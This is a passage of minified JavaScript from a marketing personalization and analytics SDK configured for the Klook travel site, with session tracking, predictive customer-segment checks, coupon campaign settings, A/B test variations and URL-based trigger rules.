pageType=self.helper.getPageType();coeffSession.landing.active=pageType;coeffSession.landing[pageType]=1;coeffWeekly.landing[pageType]++;}},pageVisitCount:function(){if(coeffSession.count.product===0&&coeffSession.count.total===0){coeffWeekly.count.product+=coeffWeekly.count.productSession;coeffWeekly.count.total+=coeffWeekly.count.totalSession;}
var pageTypes=Object.keys(coeffSession.count);pageTypes.forEach(function(pageType){if(self.helper.evalRule(pageType))
coeffSession.count[pageType]++;if(pageType==='total')
coeffSession.count.total++;});coeffWeekly.count.totalSession=coeffSession.count.total;coeffWeekly.count.productSession=coeffSession.count.product;},sessionDuration:function(){var fTimeSession=coeffSession.duration.fTimeSession;if(fTimeSession==0){coeffSession.duration.fTimeSession=new Date().getTime();}
var sessionDuration=(new Date().getTime()-coeffSession.duration.fTimeSession)/1000;coeffSession.duration.session=Math.round(sessionDuration);},productDuration:function(){var visitTime=coeffSession.duration.fTimeProduct;if(visitTime!=0){coeffSession.duration.fTimeProduct=0;coeffSession.duration.product+=Math.round((new Date().getTime()-visitTime)/1000);}
if(self.helper.evalRule('product')&&coeffSession.duration.fTimeProduct===0){coeffSession.duration.fTimeProduct=new Date().getTime();}},longPageDuration:function(){var visitTime=coeffSession.duration.fTimeLongProduct;if(visitTime){coeffSession.duration.fTimeLongProduct=0;var productTime=Math.round((new Date().getTime()-visitTime)/1000);if(productTime>coeffSession.duration.longProduct){coeffSession.duration.longProduct=productTime;}}
if(self.helper.evalRule('product')&&coeffSession.duration.fTimeLongProduct===0){coeffSession.duration.fTimeLongProduct=new Date().getTime();}},weeklySessionDuration:function(){var lastSession=coeffWeekly.duration.lastSession;coeffWeekly.duration.lastSession=coeffSession.duration.session;if(coeffWeekly.duration.lastSession===0){coeffWeekly.duration.session+=lastSession;}},weeklySessionCount:function(){var lastSession=coeffWeekly.count.lastSession;coeffWeekly.count.lastSession=coeffSession.duration.session>0?1:0;if(coeffWeekly.count.lastSession===0){coeffWeekly.count.session+=lastSession;}}}};return self.run();},checkPredictiveData:function(data,logic,predictiveType,segment){try{if(predictiveType==='l2p'){var campId=spApi.userSegments[segment];return spApi.e('true'+logic+!!spApi.assertThresholdExceeded(campId));}
var checkMultipleType=function(dataArray,logic,predictiveType){if(typeof dataArray!=='object'&&dataArray.length===0)
return false;return sQuery(dataArray).filter(function(key,value){return spApi.e('("'+value+'" '+logic+' "'+predictiveType+'")')}).get().length>0;};if(spApi.storageData('predictiveData')!=null){var predictiveData=JSON.parse(spApi.storageData('predictiveData'));if(predictiveType==='income'){if(spApi.isset(predictiveData.income)){return spApi.e('("'+data+'" '+logic+' "'+predictiveData.income+'")');}else{return;}}else if(predictiveType==='ltv'){if(spApi.isset(predictiveData.ltv)){return spApi.e('("'+data+'" '+logic+' "'+predictiveData.ltv+'")');}else{return;}}else if(predictiveType==='lifecycle_status'){if(spApi.isset(predictiveData['c_status'])){if(data==='all_v'){return checkMultipleType(['n_v','p_v','s_v'],'==',predictiveData['c_status']);}else if(data==='all_c'){return checkMultipleType(['n_c','p_c','s_c'],'==',predictiveData['c_status']);}else if(data==='all_r'){return checkMultipleType(['a','i','c'],'==',predictiveData['c_status']);}
return spApi.e('("'+data+'" == "'+predictiveData['c_status']+'")');}}else if(predictiveType==='disaffinity'){if(spApi.isset(predictiveData['disaffinity'])){try{var discountAffinityResult=logic==='!=';sQuery.each(data,function(index,discountAffinityValue){var expression='("'+discountAffinityValue+'"'+logic+'"'+
predictiveData['disaffinity']+'")';if(logic==='!='){discountAffinityResult=discountAffinityResult&&spApi.e(expression);}else{discountAffinityResult=discountAffinityResult||spApi.e(expression);}});return discountAffinityResult;}catch(e){return false;}}}else if(predictiveType==='pcdate'){if(spApi.isset(predictiveData['pcdate'])){var localPredictiveConversionRange=predictiveData['pcdate'];var d=new Date();var currentDate=d.getFullYear()+'-'+(d.getMonth()+1)+'-'+d.getDate();if(spApi.isset(localPredictiveConversionRange.lowerDate)&&spApi.isset(localPredictiveConversionRange.upperDate)){if(logic==='=='){return localPredictiveConversionRange.lowerDate<=currentDate&&localPredictiveConversionRange.upperDate>=currentDate;}else if(localPredictiveConversionRange.lowerDate>currentDate||localPredictiveConversionRange.upperDate<currentDate){return true;}}
return false;}}else if(predictiveType=='pchurn'){if(spApi.isset(predictiveData['pchurn'])){return spApi.e('("'+data+'" '+logic+' "'+predictiveData[predictiveType]+'")');}
return false;}
if(predictiveType){if(spApi.isset(predictiveData[predictiveType])){return spApi.e('("'+data+'" '+logic+' "'+predictiveData[predictiveType]+'")');}else{return;}}}else{return false;}}catch(err){spApi.errLog(err,{logType:'checkPredictiveData',bugType:'product'});return false;}},checkPredictivePurchaseData:function(data,logic,predictiveType,from,to){try{if(spApi.storageData('predictiveData')!=null){var predictiveData=JSON.parse(spApi.storageData('predictiveData'));if(predictiveType=='lastVisitDay'){if(spApi.isset(predictiveData['last_visit_date'])){var pData=new Date(predictiveData['last_visit_date']).getTime();if(logic==='between'){from=from*1000;to=to*1000;return spApi.e('('+pData+' >= '+from+' && '+pData+' <= '+to+')');}else{data=(new Date().getTime())-(data*24*60*60*1000);return spApi.e('('+data+' <= '+pData+')');}}}else if(predictiveType=='lastPurchaseDay'){if(spApi.isset(predictiveData['last_purchase_date'])){if(logic==='between'){var pData=new Date(predictiveData['last_purchase_date']).getTime();from=from*1000;to=to*1000;return spApi.e('('+pData+' >= '+from+' && '+pData+' <= '+to+')');}else{var pData=new Date(predictiveData['last_purchase_date']).getTime();data=(new Date().getTime())-(data*24*60*60*1000);return spApi.e('('+data+' <= '+pData+')');}}}else if(predictiveType==='lastPurchaseAmount'){if(spApi.isset(predictiveData['last_purchase_amount'])){var pData=parseInt(predictiveData['last_purchase_amount']);return spApi.e('('+pData+' >= parseInt('+from+') && '+pData+' <= parseInt('+to+'))');}}}
return false;}catch(err){spApi.errLog(err,{logType:'checkPredictivePurchaseData',bugType:'product'});return false;}},checkPredictiveAmountData:function(data,logic,predictiveType,from,to,amount,operator){function setAmountData(purchase_hist,type,data,from,to){var count=0;var sum=0;var avg=0;if(spApi.objKeys(purchase_hist)){sQuery.each(purchase_hist,function(orderDate,price){if(type=='between'){var fromDate=from*1000;var toDate=to*1000;var pDate=new Date(orderDate).getTime();if(pDate>=fromDate&&pDate<=toDate){sum+=parseInt(price);count++;}}else if(type=='in last'){var pDate=new Date(orderDate).getTime();var lastDate=(new Date().getTime())-(data*24*60*60*1000);if(lastDate<=pDate){sum+=parseInt(price);count++;}}else{sum+=parseInt(price);count++;}});}
avg=(count>0)?Math.round(sum/count):avg;return{count:count,sum:sum,avg:avg};}
try{if(spApi.storageData('predictiveData')!=null){var predictiveData=JSON.parse(spApi.storageData('predictiveData'));if(typeof predictiveData['purchase_hist']!=='undefined'){var result=setAmountData(predictiveData['purchase_hist'],logic,data,from,to);if(predictiveType==='avgOrder'){return spApi.e('('+result.avg+' '+operator+' '+amount+')');}else if(predictiveType==='totalSpent'){return spApi.e('('+result.sum+' '+operator+' '+amount+')');}else if(predictiveType==='purchaseCount'){return spApi.e('('+result.count+' '+operator+' '+amount+')');}}}
return false;}catch(err){spApi.errLog(err,{logType:'checkPredictiveAmountData',bugType:'product'});return false;}},newReturningUser:function(logics){try{var result=false;if(logics==='new'){result=(localStorage.getItem('userDateV')===null||JSON.parse(localStorage.getItem('userDateV')).length<=1);}else if(logics==='returning'){result=(JSON.parse(localStorage.getItem('userDateV'))||[]).length>1;}
return result;}catch(err){spApi.errLog(err,{logType:'newReturningUser',bugType:'product'});return false;}},checkAnalyticsSegmentByDateCount:function(pastDayCount,analyticsSegmentId,personalizationId){if(localStorage.getItem('gaSegment-'+personalizationId)!=null){return spApi.e(localStorage.getItem('gaSegment-'+personalizationId))===1;}
return false;},checkAnalyticsSegmentByDateRange:function(fromDate,toDate,analyticsSegmentId,personalizationId){if(localStorage.getItem('gaSegment-'+personalizationId)!=null){return spApi.e(localStorage.getItem('gaSegment-'+personalizationId))===1;}
return false;},checkBehavioralSegmentsByPurchasedDay:function(lastPurchasedDays,purchaseStatus){try{if(spApi.storageData('predictiveData')!=null){var predictiveData=JSON.parse(spApi.storageData('predictiveData'));var returnStatus=false;if(predictiveData.purchased===true){var lastPurchasedDate=new Date(''+predictiveData.last_purchase_date+'');var currentDate=new Date();var timeDiff=Math.abs(currentDate.getTime()-lastPurchasedDate.getTime());var diffDays=Math.ceil(timeDiff/(1000*3600*24));if(purchaseStatus==='true'){returnStatus=diffDays<=lastPurchasedDays;}else if(purchaseStatus==='false'){returnStatus=diffDays>=lastPurchasedDays;}}else{returnStatus=false;}}else{returnStatus=false;}
return returnStatus;}catch(err){spApi.errLog(err,{logType:'checkBehavioralSegmentsByPurchasedDay',bugType:'product'});return false;}},checkBehavioralSegmentsByPurchaseAmount:function(purchaseAmount,logic){try{if(spApi.storageData('predictiveData')!=null){var predictiveData=JSON.parse(spApi.storageData('predictiveData'));if(spApi.isset(predictiveData.last_purchase_amount)&&predictiveData.purchased===true){return spApi.e('("'+predictiveData.last_purchase_amount+'" '+logic+' "'+purchaseAmount+'")');}else{return false;}}else{return false;}}catch(err){spApi.errLog(err,{logType:'checkBehavioralSegmentsByPurchaseAmount',bugType:'product'});return false;}},checkProductByCategory:function(daycount,category,persId,actionType){try{var hdata=localStorage.getItem('partnerSegmentData');if(hdata!=null){hdata=JSON.parse(hdata);if(spApi.isset(hdata[persId+'-'+actionType+''])){return spApi.objKeys(hdata[persId+'-'+actionType+'']);}else{return false;}}else{return false;}}catch(err){spApi.errLog(err,{logType:'checkProductByCategory',bugType:'product'});return false;}},checkCustomSegmentRules:function(customSegmentId){return spApi.storageData('cus'+customSegmentId)!==null;},checkAdAudience:function(type,percent,personalizationId){try{var self={};var campId=spApi.userSegments[personalizationId];var coeff=null;var threshold=0;var value=0;self.construct=function(){self.successCallback=function(){spApi.coeff.runSuccessCallback=true;if(spApi.storageData('thresholdLogSent')===null){spApi.storageData('thresholdLogSent','1',{path:'/',expires:1,domain:cookieDomain});spApi.coeff.passed=true;spApi.logger('info','Sending threshold logs...');sQuery.ajax({type:'get',url:spApi.apiUrl+'ajax.php?t=sendThresholdLog',data:{userId:sQuery.cookie('spUID')||spApi.localStorageGet('spUID'),globalId:spApi.getGlobalUserIdFromLocalStorage(),version:coeff.v,c:JSON.stringify(coeff.f),threshold:threshold,score:value,isMobile:spApi.isMobileBrowser(),sessionId:spApi.getGAStyleSesId(),campId:campId}});}};self.getVariationIdByPersonalizationId=function(){var variationId=0;sQuery.each(spApi.personalizationCamps[personalizationId].variations,function(index,variation){if(variation.ratio==100){variationId=variation.varId;return false;}});return variationId;};self.proofCallback=function(){var variation;if(campId===undefined){variation=spApi.getCamp(self.getVariationIdByPersonalizationId(personalizationId)).camp;}else{variation=spApi.getCamp(campId).camp;}
self.setABForProof();if(!spApi.storageData('PAARoiEventSentForDashboard')){var lsData={key:'sp-camp-'+variation.id,obj:{'joined':true,'step1-displayed':true},campId:variation.id};spApi.updateCookie(lsData);}else{spApi.conLog('PAA dashboard event already sent for 7 days interval');}
if(!spApi.storageData('PAARoiEventSentForServices')){if(spApi.storageData('paaGroup')==='experimental'){self.sendProofEvent(variation,'experimental');}else{self.sendProofEvent(variation,'control');}}else{spApi.conLog('PAA fb/ga event already sent for today');}};self.setABForProof=function(){if(!spApi.storageData('paaGroup')){if(Math.floor(Math.random()*100)+1<=95){spApi.storageData('paaGroup','experimental',{path:'/',expires:7,domain:cookieDomain});}else{spApi.storageData('paaGroup','control',{path:'/',expires:7,domain:cookieDomain});}}};self.sendProofEvent=function(variation,proofType){if(variation.productType==32){if(proofType==='experimental'){spApi.gaSend({type:'experimentProofEvent',campId:variation.id});}else{spApi.gaSend({type:'controlProofEvent',campId:variation.id});}}else if(variation.productType==39){if(proofType==='experimental'){spApi.fbSend({campId:variation.id});}else{spApi.fbSend({campId:variation.id,data:'roi test control'});}}
self.setEventSendFlags();};self.setEventSendFlags=function(){spApi.storageData('PAARoiEventSentForDashboard','1',{path:'/',expires:7,domain:cookieDomain});spApi.storageData('PAARoiEventSentForServices','1',{path:'/',expires:1,domain:cookieDomain});};if(result=spApi.assertThresholdExceeded(campId)){coeff=result.coeff;threshold=result.threshold;value=result.value;if(typeof spApi.coeff.runSuccessCallback==='undefined')
self.successCallback();return true;}
return false;};return self.construct();}catch(err){spApi.errLog(err,{logType:'Ad-Audience Error.',bugType:'partner',extraData:{'function':'checkAudienceLikelihoodPurchase'}});}},checkPredictiveInterestCluster:function(interestClusterId,operator){try{if(spApi.storageData('predictiveData')!=null){var interestClusterData=JSON.parse(spApi.storageData('predictiveData'));return spApi.e('("'+interestClusterId+'" '+operator+' "'+interestClusterData['interest']+'")');}else{return false;}}catch(err){spApi.errLog(err,{logType:'Interest Cluster Rule Error',bugType:'partner',extraData:{'function':'checkInterestCluster'}});return false;}},personalizationSetStatus:false,preferredCurrency:"HKD",supportedCurrencies:{"AED":{"HKD":2.131},"SGD":{"HKD":5.882}},globalExperiment:{"panelStatus":1,"status":0,"ARate":90,"BRate":10,"gaPush":0},shownCampLimit:{"status":0,"maxCount":3,"timeSpan":1},genDate:1521299770,minifyType:2,apiUrl:protocol+"klook.api.sociaplus.com/",staticUrl:protocol+"static.api.sociaplus.com/",frameUrl:"https://klook.api.sociaplus.com/frame.php",target:sQuery("#partnerTarget"),camps:[{"id":"15","campName":"|-x-|Q291cG9uJTIwQ29kZSUyMFRlc3Q=","showIn":{"trigger":[41]},"hideIn":null,"isActive":"1","productType":"24","priority":"0","trigTimeOut":"-1","trigTimeCount":"0","purMinOrderAmount":"0","triggerText":"","theme":"0","purMaxOrderAmount":"0","lang":"all_ALL","isVisible":"1","targetingCamp":"0","couponExpDate":"1521641280","locationisActive":"0","locationData":"","advancedCss":"","showNotes":"-1","activeDateStart":"1521023160","activeDateEnd":"1523701560","isSuperCamp":"0","autoClose":null,"couponAutoApply":"-1","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"1","joinControlLimit":"336","closeControlLimit":"336","noteType":"2","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","callbacks":{"show":[],"load":[],"liked":[],"close":[]},"platform":"web","conditionNeeds":{"bounce":0,"scroll":0},"isBounce":0,"isScroll":0},{"id":"18","campName":"|-x-|VmFyaWF0aW9uJTIwLSUyMDY1ODI4Mjcx","showIn":{"trigger":[42]},"hideIn":null,"isActive":"1","productType":"24","priority":"0","trigTimeOut":"-1","trigTimeCount":"0","purMinOrderAmount":"0","triggerText":"","theme":"0","purMaxOrderAmount":"0","lang":"all_ALL","isVisible":"1","targetingCamp":"0","couponExpDate":"1521793260","locationisActive":"0","locationData":"","advancedCss":"","showNotes":"-1","activeDateStart":"1521187320","activeDateEnd":"1744272120","isSuperCamp":"0","autoClose":null,"couponAutoApply":"-1","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"1","joinControlLimit":"336","closeControlLimit":"336","noteType":"2","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","callbacks":{"show":[],"load":[],"liked":[],"close":[]},"platform":"mobile","conditionNeeds":{"bounce":0,"scroll":0},"isBounce":0,"isScroll":0},{"id":"11","campName":"|-x-|Q291cG9uJTIwQ29kZSUyMFRlc3QtQ29udHJvbCUyMEdyb3VwJTIwJTI4aWQlM0EzOCUyOQ==","showIn":{"trigger":[41]},"hideIn":null,"isActive":"1","productType":"24","priority":"0","trigTimeOut":"-1","trigTimeCount":"0","purMinOrderAmount":"0","triggerText":"","theme":"0","purMaxOrderAmount":"0","lang":"all_ALL","isVisible":"-1","targetingCamp":"0","couponExpDate":"0","locationisActive":"0","locationData":"","advancedCss":"","showNotes":"","activeDateStart":"1521023160","activeDateEnd":"1523701560","isSuperCamp":"0","autoClose":null,"couponAutoApply":"1","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"1","joinControlLimit":"336","closeControlLimit":"336","noteType":"-1","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","callbacks":{"show":[],"load":[],"liked":[],"close":[]},"platform":"web","conditionNeeds":{"bounce":0,"scroll":0},"isBounce":0,"isScroll":0},{"id":"17","campName":"|-x-|dGVzdCUyMHB1cmNoYXNlJTIwdHJpZ2dlci1Db250cm9sJTIwR3JvdXAlMjAlMjhpZCUzQTM5JTI5","showIn":{"trigger":[42]},"hideIn":null,"isActive":"1","productType":"24","priority":"0","trigTimeOut":"-1","trigTimeCount":"0","purMinOrderAmount":"0","triggerText":"","theme":"0","purMaxOrderAmount":"0","lang":"all_ALL","isVisible":"-1","targetingCamp":"0","couponExpDate":"0","locationisActive":"0","locationData":"","advancedCss":"","showNotes":"","activeDateStart":"1521187320","activeDateEnd":"1744272120","isSuperCamp":"0","autoClose":null,"couponAutoApply":"1","gaEvents":{"impression":"1","join":"1","sales":"0","close":"1","goal":"0"},"isTest":"1","joinControlLimit":"336","closeControlLimit":"336","noteType":"-1","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","callbacks":{"show":[],"load":[],"liked":[],"close":[]},"platform":"mobile","conditionNeeds":{"bounce":0,"scroll":0},"isBounce":0,"isScroll":0}],journeyAttributeList:[],insights:[],webPushes:[],customSegments:[],personalizationCamps:{"9":{"variations":[{"varId":"c18","ratio":"100","type":"n"},{"varId":"c17","ratio":"0","type":"cg"}],"name":"AABIG T&C Modification","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"15":{"variations":[{"varId":"c25","ratio":"100","type":"n"},{"varId":"c24","ratio":"0","type":"cg"}],"name":"Redirecting Users to \/citi2018 | Desktop","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"17":{"variations":[{"varId":"c29","ratio":"100","type":"n"},{"varId":"c28","ratio":"0","type":"cg"}],"name":"Redirecting Users to \/citi2018 | Mobile","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"28":{"variations":[{"varId":"c53","ratio":"100","type":"n"},{"varId":"c52","ratio":"0","type":"cg"}],"name":"TH Campaign - Meta tag fix | Desktop","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"29":{"variations":[{"varId":"c55","ratio":"100","type":"n"},{"varId":"c54","ratio":"0","type":"cg"}],"name":"TH Campaign - Mobile Bug Fix | Firefox","segment":[28],"priority":"0","gaSegmentId":"","goalBuilderList":[]},"31":{"variations":[{"varId":"c61","ratio":"100","type":"n"},{"varId":"c59","ratio":"0","type":"cg"}],"name":"AABIG KV + T&C Update (Feb 18)","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"37":{"variations":[{"varId":"c74","ratio":"15","type":"n"},{"varId":"c73","ratio":"85","type":"cg"}],"name":"Shopping Cart Showing Saved Amount","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"38":{"variations":[{"varId":"15","ratio":"100","type":"n"},{"varId":"11","ratio":"0","type":"cg"}],"name":"Coupon Code Test","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]},"39":{"variations":[{"varId":"18","ratio":"95","type":"n"},{"varId":"17","ratio":"5","type":"cg"}],"name":"test purchase trigger","segment":null,"priority":"0","gaSegmentId":"","goalBuilderList":[]}},rules:{"41":{"id":"41","name":"triggerRule-1521027178","test":"(spApi.getUrl().indexOf(\"https:\/\/www.klook.com\/activity\/749-batman-dark-flight-macau\/\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"42":{"id":"42","name":"triggerRule-1521188780","test":"(spApi.isOnProductPage() === true)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"6":{"id":"6","name":"triggerRule-1513072982","test":"(spApi.getUrl().indexOf(\"airasiabig\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"13":{"id":"13","name":"triggerRule-1514546136","test":"(spApi.getUrl().indexOf(\"www.klook.com\/promo\/citi2017\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"16":{"id":"16","name":"triggerRule-1514743167","test":"(spApi.getUrl().indexOf(\"www.klook.com\/promo\/citi2017\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"26":{"id":"26","name":"triggerRule-1518716745","test":"(spApi.getUrl().indexOf(\"\/thcurator\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"27":{"id":"27","name":"triggerRule-1518709515","test":"(spApi.getUrl().indexOf(\"\/thcurator\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"28":{"id":"28","name":"segmentRule-1518878363","test":"(spApi.checkBrowser(\"Firefox\") === true)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"32":{"id":"32","name":"triggerRule-1519099384","test":"(spApi.getUrl().indexOf(\"airasiabig\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"},"40":{"id":"40","name":"triggerRule-1521004939","test":"(spApi.getUrl().indexOf(\"\/shoppingcart\") > -1)","targetingTemplate":"0","relationalRule":"0","segmentId":"","docReadyOption":"0","isProcessed":"1","weatherActive":"0","isRelational":"0"}},triggerText:"",notifies:{"11":{"notifCpnStatus":0,"cssConfig":{"backgroundColor":"transparent","borderColor":"rgb(51, 51, 51)","borderRadius":"0px","borderWidth":"1px","height":"0","overlay":"none","overlayColor":"rgb(0, 0, 0)","overlayOpacity":"0","width":"0","shadow":"none","paginationType":"bullet","paginationNextPrev":"true","paginationActiveColor":"","paginationPassiveColor":""},"effectConfig":{},"highlightConfig":{},"locationConfig":{"position":"fixed","left":"0","top":"0","type":"0","windowHeight":"651","windowWidth":"1903","selectedElement":""},"noteSettings":false,"triggerIsActive":"0","triggerSettings":false,"formConfig":"","mode":"advanced","predictiveFeedSettings":null,"content":"","socialProofSettings":{},"kkbSettings":[],"waitForKKBData":false},"15":{"notifCpnStatus":1,"cssConfig":{"backgroundColor":"#fff","borderColor":"rgb(51, 51, 51)","borderRadius":"0px","borderWidth":"0px","height":"32","overlay":"none","overlayColor":"#000000","overlayOpacity":"0.6","overlayClose":"false","width":"209","shadow":"none","borderStyle":"none","paginationType":"none","paginationNextPrev":"true","paginationActiveColor":"0","paginationPassiveColor":"0","slideEffect":"slide","specificMenu":""},"effectConfig":{},"highlightConfig":{"closeOnClick":"true","closeOnEsc":"true","scroll":"false","scrollSize":"0","scrollSpeed":"500","customSelector":"false"},"locationConfig":{"position":"fixed","left":"597","top":"15","type":"0","windowHeight":"530","windowWidth":"1366","windowHref":"https:\/\/www.klook.com\/activity\/749-batman-dark-flight-macau\/","selectedElement":"div#book > div:eq(0) > ul > li:eq(1)","productAlias":"info","gridIsActive":"false","mode":"advanced","right":"auto","bottom":"auto","marginTop":"0","marginLeft":"-105px"},"noteSettings":{"upgraded":true,"assistColor":"#55bcf5","showCoupon":true,"showTimer":true,"assistTexts":{"title":"Your Coupon","desc":"Complete your order and payment before the time runs out","copy":"Copy","close":"Close"},"webPosition":"bottom-right","mobilePosition":"bottom","couponExpDate":1521641280,"couponExpireDate1":"0","couponExpireDate2":"30","couponTimerWarningTime":"0","couponTimerWarningText":"","couponTimerNotAppliedText":"","ntWarningBackground":"ffffff","ntWarningText":"000000","ntNotWarningBackground":"ffffff","ntNotWarningText":"000000","couponTimerWarningEffect":"-1","couponTimerRuleId":"0"},"triggerIsActive":"0","triggerSettings":{"status":"0","effect":"none","positionDirection":"left","image":"none","fixed":"1","position":{"left":"0","right":"0","top":"0","bottom":"0","windowWidth":"1349","windowHeight":"530"},"showFirst":"false"},"formConfig":"[]","mode":"advanced","predictiveFeedSettings":"","content":"","socialProofSettings":{},"kkbSettings":[],"waitForKKBData":false},"17":{"notifCpnStatus":0,"cssConfig":{"backgroundColor":"transparent","borderColor":"rgb(51, 51, 51)","borderRadius":"0px","borderWidth":"1px","height":"0","overlay":"none","overlayColor":"rgb(0, 0, 0)","overlayOpacity":"0","width":"0","shadow":"none","paginationType":"bullet","paginationNextPrev":"true","paginationActiveColor":"","paginationPassiveColor":""},"effectConfig":{},"highlightConfig":{},"locationConfig":{"position":"fixed","left":"0","top":"0","type":"0","windowHeight":"651","windowWidth":"1903","selectedElement":""},"noteSettings":false,"triggerIsActive":"0","triggerSettings":false,"formConfig":"","mode":"advanced","predictiveFeedSettings":null,"content":"","socialProofSettings":{},"kkbSettings":[],"waitForKKBData":false},"18":{"notifCpnStatus":0,"cssConfig":{"background-color":"rgba(0, 0, 0, 0)","background-image":"none","border-width":"0px","border-style":"none","border-color":"rgb(51, 51, 51)"},"effectConfig":{},"highlightConfig":"","locationConfig":{"type":"0","mode":"adaptive","position":"fixed","left":"145","top":"264","windowHeight":"568","windowWidth":"320","windowHref":"https:\/\/www.klook.com\/","selectedElement":"","frameless":"true","gridIsActive":"true","gridConfig":{"gridIsActive":"true","mode":"adaptive","xDirection":"right","yDirection":"middle"}},"noteSettings":{"upgraded":true,"assistColor":"#55bcf5","showCoupon":true,"showTimer":true,"assistTexts":{"title":"Your Coupon","desc":"Complete your order and payment before the time runs out","copy":"Copy","close":"Close"},"webPosition":"bottom-right","mobilePosition":"bottom","couponExpDate":1521793260,"couponExpireDate1":"0","couponExpireDate2":"30","couponTimerWarningTime":"0","couponTimerWarningText":"","couponTimerNotAppliedText":"","ntWarningBackground":"ffffff","ntWarningText":"000000","ntNotWarningBackground":"ffffff","ntNotWarningText":"000000","couponTimerWarningEffect":"-1","couponTimerRuleId":"0"},"triggerIsActive":"0","triggerSettings":{"status":"0","effect":"none","positionDirection":"right","image":"none","fixed":"0","showFirst":"false"},"formConfig":"{}","mode":"adaptive","predictiveFeedSettings":"","content":"","socialProofSettings":{},"kkbSettings":[],"waitForKKBData":false}},customizationCamps:[{"id":"c18","campName":"|-x-|VmFyaWF0aW9uJTIwLSUyMDE0NTIyMDQ3","isActive":"1","activeDateStart":"1513072920","activeDateEnd":"1609495320","locationData":false,"showIn":{"segment":null,"trigger":[6]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[{"type":"changedText","html":"- One-off bonus 300 BIG points for first time purchase at Dedicated Website by newly registered KLOOK user does not include $0 \u2018free pay\u2019 activities on www.klook.com or app.","selectorString":"body > div:eq(9) > div:eq(1) > ol > ul > li:eq(4) > p:eq(6)","id":"sp-custom-18-1513073149486","parentNodeSelector":"body > div:eq(9) > div:eq(1) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"- One-off bonus 300 BIG points for first time purchase at Dedicated Website by newly registered KLOOK user does not include $0 \u2018free pay\u2019 activities on www.klook.com or app.","selectorString":"body > div:eq(9) > div:eq(1) > ol > ul > li:eq(4) > p:eq(6)","id":"sp-custom-18-1513073171222","parentNodeSelector":"body > div:eq(9) > div:eq(1) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/airasiabig"},{"type":"changedText","html":"- One-off bonus 300 BIG points for first time purchase at Dedicated Website by newly registered KLOOK user does not include $0 \u2018free pay\u2019 activities on www.klook.com or app.","selectorString":"body > div:eq(10) > div:eq(1) > ol > ul > li:eq(4) > p:eq(6)","id":"sp-custom-18-1513073644521","parentNodeSelector":"body > div:eq(10) > div:eq(1) > ol > ul > li:eq(4)","editUrl":"https:\/\/www.klook.com\/ko\/airasiabig"}],"customJs":"","customCss":"","lang":"en_US","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"0","join":"0","sales":"0","close":"0","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c25","campName":"|-x-|UmVkaXJlY3RpbmclMjBVc2VycyUyMHRvJTIwJTJGY2l0aTIwMTglMjAlN0MlMjBEZXNrdG9w","isActive":"1","activeDateStart":"1514736000","activeDateEnd":"1769771640","locationData":false,"showIn":{"segment":null,"trigger":[13]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[],"customJs":"location.href = location.href.replace('\/citi2017', '\/citi2018')","customCss":"","lang":"all_ALL","trigTimeCount":"0","priority":"0","productType":"20","gaEvents":{"impression":"1","join":"1","sales":"0","close":"0","goal":"0"},"isTest":"0","ie8Support":"0","saLogDuration":"336","cookieTime":"14","dailyDisplay":"{\"status\":1,\"start\":\"00:00\",\"end\":\"23:59\",\"days\":[\"all\"]}","platform":"web","runDocReady":"0"},{"id":"c29","campName":"|-x-|UmVkaXJlY3RpbmclMjBVc2VycyUyMHRvJTIwJTJGY2l0aTIwMTglMjAlN0MlMjBNb2JpbGU=","isActive":"1","activeDateStart":"1514743080","activeDateEnd":"1798826280","locationData":false,"showIn":{"segment":null,"trigger":[16]},"hideIn":null,"locationisActive":"0","targetingCamp":"0","customizationList":[],"customJs":"location.href = 